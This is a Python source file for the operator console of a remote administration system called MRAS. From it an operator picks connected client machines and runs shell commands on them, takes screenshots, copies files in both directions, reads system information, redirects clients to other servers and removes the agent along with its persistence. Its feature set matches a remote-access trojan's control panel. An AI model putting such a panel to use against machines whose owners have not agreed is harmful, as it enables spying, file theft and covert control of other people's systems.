"""
MRAS Admin CLI — Rich-powered interactive control panel.

Usage:
    python admin/main.py [--server ws://host:port] [--token TOKEN]

Commands (interactive):
    list                         — list online clients
    select <client_id>           — set target client
    exec <command>               — run shell command on target
    screenshot [--jpeg]          — capture screenshot
    download <remote_path>       — download file from client
    upload <local_path> <remote> — upload file to client
    sysinfo                      — system information
    servers <uri> [<uri>...]     — push new server list to client
    redirect <uri>               — redirect client to new server
    help                         — show this help
    quit / exit                  — exit
"""
from __future__ import annotations
import asyncio
import base64
import datetime
import io
import logging
import logging.handlers
import os
import sys
import time
import uuid
from pathlib import Path

import yaml
from rich.console import Console
from rich.live import Live
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich.table import Table
from rich.text import Text
from rich import print as rprint

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from admin.connection import AdminConnection
from shared.models import Message, MessageType

console = Console()
log = logging.getLogger("mras.admin")


# ── Config ─────────────────────────────────────────────────────────────────

def load_config() -> dict:
    config_path = Path(__file__).parent / "config.yaml"
    with open(config_path) as f:
        cfg = yaml.safe_load(f)
    cfg["admin"]["secret"] = os.environ.get("MRAS_SECRET", cfg["admin"]["secret"])
    cfg["admin"]["admin_token"] = os.environ.get("MRAS_ADMIN_TOKEN", cfg["admin"]["admin_token"])
    return cfg


def setup_logging(cfg: dict) -> None:
    lc = cfg["logging"]
    Path("logs").mkdir(exist_ok=True)
    level = getattr(logging, lc["level"].upper(), logging.INFO)
    fmt = "%(asctime)s [%(levelname)s] %(name)s: %(message)s"
    fh = logging.handlers.RotatingFileHandler(lc["file"], maxBytes=5*1024*1024, backupCount=3)
    fh.setFormatter(logging.Formatter(fmt))
    logging.basicConfig(level=level, format=fmt, handlers=[fh])


# ── State ───────────────────────────────────────────────────────────────────

class AdminState:
    def __init__(self) -> None:
        self.clients: dict[str, dict] = {}   # client_id → ClientInfo dict
        self.selected: str | None = None
        self.pending_results: dict[str, asyncio.Future] = {}  # msg_id → Future


state = AdminState()


# ── Message dispatcher (background) ────────────────────────────────────────

async def dispatch_loop(conn: AdminConnection) -> None:
    """Background task: route server messages to the right place."""
    while True:
        msg = await conn.recv()
        if msg is None:
            break

        if msg.type == MessageType.CLIENT_LIST:
            state.clients = {c["client_id"]: c for c in msg.payload.get("clients", [])}

        elif msg.type == MessageType.CLIENT_CONNECTED:
            cid = msg.payload.get("client_id")
            if cid:
                state.clients[cid] = msg.payload
                console.print(f"\n[bold green][+] Client connected:[/] {cid} ({msg.payload.get('hostname')})")

        elif msg.type == MessageType.CLIENT_DISCONNECTED:
            cid = msg.payload.get("client_id")
            if cid:
                state.clients.pop(cid, None)
                if state.selected == cid:
                    state.selected = None
                console.print(f"\n[bold red][-] Client disconnected:[/] {cid}")

        elif msg.type in (MessageType.COMMAND_RESULT, MessageType.COMMAND_ERROR,
                          MessageType.FILE_DATA, MessageType.ERROR):
            mid = msg.payload.get("msg_id") or msg.msg_id
            fut = state.pending_results.pop(mid, None)
            if fut and not fut.done():
                fut.set_result(msg)

        elif msg.type == MessageType.PONG:
            pass


# ── Helpers ────────────────────────────────────────────────────────────────

async def send_command(conn: AdminConnection, cfg: dict, command: str, payload: dict) -> Message | None:
    """Send a COMMAND message and wait for the result."""
    target = state.selected
    if not target:
        console.print("[red]No client selected. Use 'select <client_id>'[/]")
        return None

    msg_id = str(uuid.uuid4())
    payload["command"] = command
    payload["msg_id"] = msg_id

    msg = Message(
        type=MessageType.COMMAND,
        payload=payload,
        target_id=target,
        msg_id=msg_id,
    )

    timeout = cfg["admin"]["command_timeout"]
    loop = asyncio.get_event_loop()
    fut: asyncio.Future = loop.create_future()
    state.pending_results[msg_id] = fut

    await conn.send(msg)

    try:
        result = await asyncio.wait_for(fut, timeout=timeout)
        return result
    except asyncio.TimeoutError:
        state.pending_results.pop(msg_id, None)
        console.print(f"[yellow]Timeout waiting for command '{command}' result[/]")
        return None


def render_client_table() -> Table:
    table = Table(title="Online Clients", show_header=True, header_style="bold cyan")
    table.add_column("ID", style="dim", width=36)
    table.add_column("Hostname")
    table.add_column("User")
    table.add_column("OS")
    table.add_column("IP")
    table.add_column("Connected")
    table.add_column("Selected", justify="center")

    for cid, info in state.clients.items():
        ts = datetime.datetime.fromtimestamp(info.get("connected_at", 0)).strftime("%H:%M:%S")
        selected = "[bold green]✓[/]" if cid == state.selected else ""
        table.add_row(
            cid[:8] + "...",
            info.get("hostname", "?"),
            info.get("username", "?"),
            info.get("os", "?")[:30],
            info.get("ip", "?"),
            ts,
            selected,
        )
    return table


# ── Command handlers ────────────────────────────────────────────────────────

async def cmd_list(conn, cfg, args):
    console.print(render_client_table())
    console.print(f"Total: [bold]{len(state.clients)}[/] client(s)")


async def cmd_select(conn, cfg, args):
    if not args:
        console.print("[red]Usage: select <client_id or prefix>[/]")
        return
    prefix = args[0]
    matches = [cid for cid in state.clients if cid.startswith(prefix)]
    if not matches:
        console.print(f"[red]No client matching '{prefix}'[/]")
    elif len(matches) > 1:
        console.print(f"[yellow]Ambiguous: {matches}[/]")
    else:
        state.selected = matches[0]
        info = state.clients[matches[0]]
        console.print(f"[green]Selected:[/] {matches[0]} ({info.get('hostname')})")


async def cmd_exec(conn, cfg, args):
    command = " ".join(args)
    if not command:
        console.print("[red]Usage: exec <command>[/]")
        return
    with console.status(f"Running: [cyan]{command}[/] ..."):
        result = await send_command(conn, cfg, "execute", {"shell": command})
    if result:
        if result.type == MessageType.COMMAND_ERROR:
            console.print(f"[red]Error:[/] {result.payload.get('error')}")
        else:
            r = result.payload.get("result", {})
            if r.get("stdout"):
                console.print(Panel(r["stdout"].rstrip(), title="stdout", border_style="green"))
            if r.get("stderr"):
                console.print(Panel(r["stderr"].rstrip(), title="stderr", border_style="yellow"))
            console.print(f"Exit code: [bold]{r.get('exit_code')}[/]")


async def cmd_screenshot(conn, cfg, args):
    fmt = "jpeg" if "--jpeg" in args else "png"
    with console.status("Capturing screenshot ..."):
        result = await send_command(conn, cfg, "screenshot", {"format": fmt})
    if result:
        if result.type == MessageType.COMMAND_ERROR:
            console.print(f"[red]Error:[/] {result.payload.get('error')}")
        else:
            r = result.payload.get("result", {})
            img_b64 = r.get("image", "")
            if img_b64:
                ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
                ext = r.get("format", fmt)
                dl_dir = Path(cfg["admin"]["download_dir"])
                dl_dir.mkdir(parents=True, exist_ok=True)
                out = dl_dir / f"screenshot_{state.selected[:8]}_{ts}.{ext}"
                out.write_bytes(base64.b64decode(img_b64))
                size_kb = len(base64.b64decode(img_b64)) // 1024
                console.print(f"[green]Screenshot saved:[/] {out} ({size_kb} KB)")


async def cmd_download(conn, cfg, args):
    if not args:
        console.print("[red]Usage: download <remote_path>[/]")
        return
    remote = args[0]
    with console.status(f"Downloading [cyan]{remote}[/] ..."):
        result = await send_command(conn, cfg, "download_file", {"path": remote})
    if result:
        if result.type == MessageType.COMMAND_ERROR:
            console.print(f"[red]Error:[/] {result.payload.get('error')}")
        else:
            r = result.payload.get("result", {})
            data_b64 = r.get("data", "")
            if data_b64:
                dl_dir = Path(cfg["admin"]["download_dir"])
                dl_dir.mkdir(parents=True, exist_ok=True)
                out = dl_dir / r.get("filename", "downloaded_file")
                out.write_bytes(base64.b64decode(data_b64))
                console.print(f"[green]Saved:[/] {out} ({r.get('size', '?')} bytes)")


async def cmd_upload(conn, cfg, args):
    if len(args) < 2:
        console.print("[red]Usage: upload <local_path> <remote_path>[/]")
        return
    local, remote = args[0], args[1]
    local_path = Path(local)
    if not local_path.exists():
        console.print(f"[red]Local file not found: {local}[/]")
        return
    data_b64 = base64.b64encode(local_path.read_bytes()).decode()
    with console.status(f"Uploading [cyan]{local}[/] → {remote} ..."):
        result = await send_command(conn, cfg, "upload_file",
                                    {"path": remote, "data": data_b64, "overwrite": True})
    if result:
        if result.type == MessageType.COMMAND_ERROR:
            console.print(f"[red]Error:[/] {result.payload.get('error')}")
        else:
            r = result.payload.get("result", {})
            console.print(f"[green]Uploaded:[/] {r.get('saved')} ({r.get('size')} bytes)")


async def cmd_sysinfo(conn, cfg, args):
    with console.status("Fetching system info ..."):
        result = await send_command(conn, cfg, "sysinfo", {})
    if result:
        if result.type == MessageType.COMMAND_ERROR:
            console.print(f"[red]Error:[/] {result.payload.get('error')}")
        else:
            r = result.payload.get("result", {})
            table = Table(title="System Info", show_header=False)
            table.add_column("Key", style="cyan")
            table.add_column("Value")
            for k, v in r.items():
                table.add_row(k, str(v))
            console.print(table)


async def cmd_servers(conn, cfg, args):
    if not args:
        console.print("[red]Usage: servers <uri> [<uri>...][/]")
        return
    result = await send_command(conn, cfg, "update_servers", {"servers": args})
    if result:
        if result.type == MessageType.COMMAND_ERROR:
            console.print(f"[red]Error:[/] {result.payload.get('error')}")
        else:
            console.print(f"[green]Server list updated on client:[/] {args}")


async def cmd_redirect(conn, cfg, args):
    if not args:
        console.print("[red]Usage: redirect <uri>[/]")
        return
    result = await send_command(conn, cfg, "change_server", {"server": args[0]})
    if result:
        if result.type == MessageType.COMMAND_ERROR:
            console.print(f"[red]Error:[/] {result.payload.get('error')}")
        else:
            console.print(f"[green]Redirect sent:[/] {args[0]}")


async def cmd_listdir(conn, cfg, args):
    path = args[0] if args else "."
    with console.status(f"Listing [cyan]{path}[/] ..."):
        result = await send_command(conn, cfg, "list_dir", {"path": path})
    if result:
        if result.type == MessageType.COMMAND_ERROR:
            console.print(f"[red]Error:[/] {result.payload.get('error')}")
        else:
            r = result.payload.get("result", {})
            table = Table(title=f"Directory: {r.get('path')}", show_header=True)
            table.add_column("Name")
            table.add_column("Type", style="cyan")
            table.add_column("Size", justify="right")
            for e in r.get("entries", []):
                size = f"{e['size']:,}" if e.get("size") else "-"
                table.add_row(e["name"], e["type"], size)
            console.print(table)


async def cmd_uninstall(conn, cfg, args):
    if not state.selected:
        console.print("[red]No client selected.[/]")
        return
    info = state.clients.get(state.selected, {})
    host = info.get("hostname", state.selected[:8])
    console.print(f"[yellow]⚠ Uninstalling agent on {host} ...[/]")
    result = await send_command(conn, cfg, "uninstall", {})
    if result:
        if result.type == MessageType.COMMAND_ERROR:
            console.print(f"[red]Error:[/] {result.payload.get('error')}")
        else:
            r = result.payload.get("result", result.payload)
            if r.get("persistence_removed") is False:
                console.print(f"[yellow]Persistence removal warning:[/] {r.get('persistence_error', '?')}")
            else:
                console.print("[green]✓ Persistence removed[/]")
            console.print(f"[green]✓ {r.get('message', 'Agent is shutting down.')}[/]")
            state.selected = None


COMMANDS = {
    "list": cmd_list,
    "ls": cmd_list,
    "select": cmd_select,
    "exec": cmd_exec,
    "run": cmd_exec,
    "screenshot": cmd_screenshot,
    "ss": cmd_screenshot,
    "download": cmd_download,
    "get": cmd_download,
    "upload": cmd_upload,
    "put": cmd_upload,
    "sysinfo": cmd_sysinfo,
    "info": cmd_sysinfo,
    "servers": cmd_servers,
    "redirect": cmd_redirect,
    "dir": cmd_listdir,
    "listdir": cmd_listdir,
    "uninstall": cmd_uninstall,
}

HELP_TEXT = """
[bold cyan]MRAS Admin Panel Commands[/]

  [cyan]list[/]                         List online clients
  [cyan]select[/] <id_prefix>           Select target client
  [cyan]exec[/] <cmd>                   Execute shell command
  [cyan]screenshot[/] [--jpeg]          Take screenshot
  [cyan]download[/] <remote_path>       Download file from client
  [cyan]upload[/] <local> <remote>      Upload file to client
  [cyan]sysinfo[/]                      Get system information
  [cyan]dir[/] [path]                   List directory contents
  [cyan]servers[/] <uri> [<uri>...]     Push new server list to client
  [cyan]redirect[/] <uri>               Redirect client to new server
  [cyan]uninstall[/]                    Remove agent from target machine
  [cyan]help[/]                         Show this help
  [cyan]quit[/] / [cyan]exit[/]                   Exit
"""

# ── Main REPL ───────────────────────────────────────────────────────────────

async def repl(conn: AdminConnection, cfg: dict) -> None:
    console.print(Panel(
        "[bold green]MRAS Admin Panel[/] — type [cyan]help[/] for commands",
        border_style="green",
    ))

    loop = asyncio.get_event_loop()
    listen_task = loop.create_task(conn.listen())
    dispatch_task = loop.create_task(dispatch_loop(conn))

    # Give a moment for client list to arrive
    await asyncio.sleep(0.3)

    while True:
        try:
            prompt = f"[bold green]mras[/]"
            if state.selected:
                short = state.selected[:8]
                info = state.clients.get(state.selected, {})
                host = info.get("hostname", "?")
                prompt += f"[white]([/][cyan]{host}[/][white]/{short})[/]"
            prompt += "[bold green] >[/] "

            # Use asyncio-compatible input
            line = await loop.run_in_executor(None, lambda: input(
                f"\033[1;32mmras"
                + (f"({state.clients.get(state.selected, {}).get('hostname','?')}/{state.selected[:8]})" if state.selected else "")
                + " > \033[0m"
            ))
        except (EOFError, KeyboardInterrupt):
            break

        line = line.strip()
        if not line:
            continue

        parts = line.split()
        verb = parts[0].lower()
        args = parts[1:]

        if verb in ("quit", "exit", "q"):
            break
        elif verb == "help":
            console.print(HELP_TEXT)
        elif verb in COMMANDS:
            try:
                await COMMANDS[verb](conn, cfg, args)
            except Exception as exc:
                console.print(f"[red]Command error:[/] {exc}")
        else:
            console.print(f"[yellow]Unknown command:[/] {verb}. Type 'help' for help.")

    listen_task.cancel()
    dispatch_task.cancel()
    await conn.close()
    console.print("[dim]Goodbye.[/]")


# ── Entry point ─────────────────────────────────────────────────────────────

async def main() -> None:
    import argparse
    parser = argparse.ArgumentParser(description="MRAS Admin CLI")
    parser.add_argument("--server", help="Override server URI")
    parser.add_argument("--token", help="Override admin token")
    args = parser.parse_args()

    cfg = load_config()
    setup_logging(cfg)

    if args.server:
        cfg["admin"]["server"] = args.server
    if args.token:
        cfg["admin"]["admin_token"] = args.token

    conn = AdminConnection(cfg)
    try:
        await conn.connect()
    except Exception as exc:
        console.print(f"[bold red]Failed to connect:[/] {exc}")
        sys.exit(1)

    await repl(conn, cfg)


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
